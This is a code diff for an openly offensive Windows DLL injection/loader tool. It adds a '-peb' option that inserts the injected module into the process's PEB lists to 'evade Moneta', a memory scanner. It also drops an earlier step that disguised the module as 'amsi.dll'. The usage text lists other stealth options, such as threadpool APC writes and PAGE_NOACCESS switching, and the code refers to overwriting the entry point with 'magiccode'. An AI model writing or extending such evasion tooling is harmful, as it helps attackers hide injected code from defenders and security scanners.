@@ -45,6 +45,14 @@ void SimpleSleep(DWORD dwMilliseconds)
     }
 }
 
+// Function to get the DLL name from the full path
+const wchar_t* GetDllNameFromPath(const wchar_t* dllPath) {
+    const wchar_t* dllName = wcsrchr(dllPath, L'\\');
+    if (dllName) {
+        return dllName + 1; // Move past the backslash
+    }
+    return dllPath; // If no backslash found, the path is already the DLL name
+}
 
 typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
     LIST_ENTRY InLoadOrderLinks;
@@ -487,7 +495,7 @@ namespace dynamic {
             curr = curr->Flink;
         } while (curr != head);
 
-        return NULL;
+        return 0;
     }
 
     // Given the base address of a DLL in memory, returns the address of an exported function
@@ -516,7 +524,7 @@ namespace dynamic {
             }
         }
 
-        return NULL;
+        return 0;
     }
 
     // Given the base address of a DLL in memory, returns the address of an exported function by hash
@@ -539,7 +547,7 @@ namespace dynamic {
             }
         }
 
-        return NULL; // Function not found
+        return 0; // Function not found
     }
 
 
@@ -640,6 +648,7 @@ void PrintUsageAndExit() {
     wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
     wprintf(L"  -pool               Use Threadpool for APC Write\n");
     wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection\n");
+    wprintf(L"  -peb                Use custom function to add loaded module to PEB lists to evade Moneta\n");
     wprintf(L"  -dotnet             Use .NET assemblies instead of regular DLLs\n");
     wprintf(L"  -a                  Switch to PAGE_NOACCESS after write the memory to .text section\n");
     ExitProcess(0);
@@ -1316,6 +1325,7 @@ int main(int argc, char *argv[])
     BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
     BOOL bUseDotnet = FALSE; // Default to FALSE
     BOOL bUseNoAccess = FALSE; // Default to FALSE
+    BOOL bUseAddPebList = FALSE; // Default to FALSE
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-h") == 0) {
@@ -1335,6 +1345,8 @@ int main(int argc, char *argv[])
             bUseCreateThreadpoolWait = TRUE;
         } else if (strcmp(argv[i], "-ldr") == 0) {
             bUseLdrLoadDll = TRUE;
+        } else if (strcmp(argv[i], "-peb") == 0) {
+            bUseAddPebList = TRUE;
         } else if (strcmp(argv[i], "-dotnet") == 0) {
             if(bUseCustomDLL) {
                 bUseDotnet = TRUE;
@@ -1512,7 +1524,7 @@ int main(int argc, char *argv[])
     
     PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
 	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
-    wprintf(L"DLL %ls added to PEB lists\n", dllPath);
+
 
     // Overwrite the AddressOfEntryPoint with magiccode
     // SIZE_T bytesWritten;
@@ -1593,14 +1605,19 @@ int main(int argc, char *argv[])
     printf("[!] press any key to continue\n");
     getchar();
     if(!bUseLdrLoadDll) {
-        bool bLinkModuleToPEB = LinkModuleToPEB((PBYTE)fileBase, dllPath, L"amsi.dll", (ULONG_PTR)fileBase);
-        if(bLinkModuleToPEB) {
-            printf("[+] LinkModuleToPEB succeeded\n");
-        } else {
-            printf("[-] LinkModuleToPEB failed\n");
+        if(bUseAddPebList) {
+            const wchar_t* dllName = GetDllNameFromPath(dllPath);
+
+            bool bAddModuleToPEB = AddModuleToPEB((PBYTE)fileBase, dllPath, (LPWSTR)dllName, (ULONG_PTR)fileBase);
+            if(bAddModuleToPEB) {
+                printf("[+] AddModuleToPEB succeeded\n");
+                wprintf(L"DLL %ls added to PEB lists\n", dllPath);
+            } else {
+                printf("[-] AddModuleToPEB failed\n");
+            }
+            printf("[!] press any key to continue\n");
+            getchar();
         }
-        printf("[!] press any key to continue\n");
-        getchar();
     }
 
     ULONG Protect = PAGE_EXECUTE_READ;
